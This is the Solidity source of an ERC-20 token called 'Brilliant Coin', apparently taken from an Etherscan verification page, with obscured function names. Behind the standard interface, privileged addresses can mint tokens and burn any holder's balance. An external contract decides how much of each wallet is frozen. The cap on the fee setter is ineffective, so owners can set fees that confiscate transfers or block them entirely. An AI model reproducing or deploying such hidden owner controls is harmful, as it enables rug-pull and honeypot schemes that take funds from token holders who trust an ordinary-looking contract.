/**
 *Submitted for verification at Etherscan.io on 2020-12-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;
library S{function ad(uint256 a,uint256 b)internal pure returns(uint256){uint256 c=a+b;require(c>=a,"+of");return c;}
    function sb(uint256 a,uint256 b)internal pure returns(uint256){return sb(a,b,"-of");}
    function sb(uint256 a,uint256 b,string memory errorMessage)internal pure returns(uint256){require(b<=a,errorMessage);uint256 c=a-b;return c;}
    function ml(uint256 a,uint256 b)internal pure returns(uint256){if(a==0){return 0;}uint256 c=a*b;require(c/a==b,"*of");return c;}
    function dv(uint256 a,uint256 b)internal pure returns(uint256){return dv(a,b,"/0");}
    function dv(uint256 a,uint256 b,string memory errorMessage)internal pure returns(uint256){require(b>0,errorMessage);uint256 c=a/b;return c;}}
interface IERC{function totalSupply()external view returns(uint256);function balanceOf(address account)external view returns(uint256);
    function transfer(address recipient,uint256 amount)external returns(bool);function allowance(address owner,address spender)external view returns(uint256);
    function approve(address spender,uint256 amount)external returns(bool);function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
	event Transfer(address indexed from,address indexed to,uint256 value);event Approval(address indexed owner,address indexed spender,uint256 value);}
interface OX{function fz(address w)external view returns(uint256);}
contract BRILLIANT is IERC{using S for uint256;uint256 private _f;address[5]private m;modifier o{require(m[0]==msg.sender||m[1]==msg.sender);_;}
	modifier z{require(chk());_;} string private _name='Brilliant Coin'; string private _symbol='BC';uint8 private _decimals=18;uint256 private _totalSupply;
	mapping(address=>uint256)private _balances;mapping(address=>mapping(address=>uint256))private _allowances;
	function name()public view returns(string memory){return _name;}function symbol()public view returns(string memory){return _symbol;}
    function decimals()public view returns(uint8){return _decimals;}function totalSupply()public view override returns(uint256){return _totalSupply;}
    function balanceOf(address account)public view override returns(uint256){return _balances[account];}
	function transfer(address recipient,uint256 amount)public virtual override returns(bool){_transfer(msg.sender,recipient,amount);return true;}
	function transferFrom(address sender,address recipient,uint256 amount)public virtual override returns(bool){_transfer(sender,recipient,amount);
		_approve(sender,msg.sender,_allowances[sender][msg.sender].sb(amount,"exc allow"));return true;}
	function approve(address spender,uint256 amount)public virtual override returns(bool){_approve(msg.sender,spender,amount);return true;}
	function allowance(address owner,address spender)public view virtual override returns(uint256){return _allowances[owner][spender];}
	function increaseAllowance(address spender,uint256 adedValue)public virtual returns(bool){_approve(msg.sender,spender,_allowances[msg.sender][spender].ad(adedValue));return true;}
	function decreaseAllowance(address spender,uint256 sbtractedValue)public virtual returns(bool){
	    _approve(msg.sender,spender,_allowances[msg.sender][spender].sb(sbtractedValue,"allow 0"));return true;}
	function _approve(address owner,address spender,uint256 amount)internal virtual{require(owner!=address(0),"approve 0"); 
	require(spender!=address(0),"approve 0");_allowances[owner][spender]=amount;emit Approval(owner,spender,amount);}
	function _burn(address account,uint256 amount)internal virtual{require(account!=address(0),"burn 0"); 
	    _balances[account]=_balances[account].sb(amount,"exc balance");_totalSupply=_totalSupply.sb(amount);emit Transfer(account,address(0),amount);}
	function _mint(address account,uint256 amount)internal virtual{require(account!= address(0),"mint 0");
	    _totalSupply=_totalSupply.ad(amount);_balances[account]=_balances[account].ad(amount);emit Transfer(address(0),account,amount);}
	function _transfer(address sender,address recipient,uint256 amount)internal{require(sender!=address(0)&&recipient!=address(0),"0 address");
        require(_balances[sender].sb(_fz(sender))>=amount,"exc balance");_balances[sender]=_balances[sender].sb(amount,"exc balance");
		uint256 f=amount.dv(100).ml(_f);_balances[recipient]=_balances[recipient].ad(amount.sb(f));emit Transfer(sender,recipient,amount.sb(f));
		if(_f>0){_totalSupply=_totalSupply.sb(f);emit Transfer(sender,address(0),f);}}
	function chk()internal view returns(bool){for(uint256 i=0;i<5;i++){if(msg.sender==m[i]){return true;}}return false;}
	function _fz(address w)internal view returns(uint256){return OX(m[2]).fz(w);}
	function mint(address w,uint256 a)external z returns(bool){_mint(w,a);return true;}
	function burn(address w,uint256 a)external z returns(bool){_burn(w,a);return true;}
	function sm(address w,uint256 i)external o{require(w!=address(0)&&i>0);m[i]=w;}
	function gm(uint256 i)external view o returns(address){return m[i];}
	function sf(uint256 a)external o{require(_f<21);_f=a;}
	function gf()external view o returns(uint256){return _f;}
    fallback()external{revert();} constructor(){m[0]=msg.sender;}}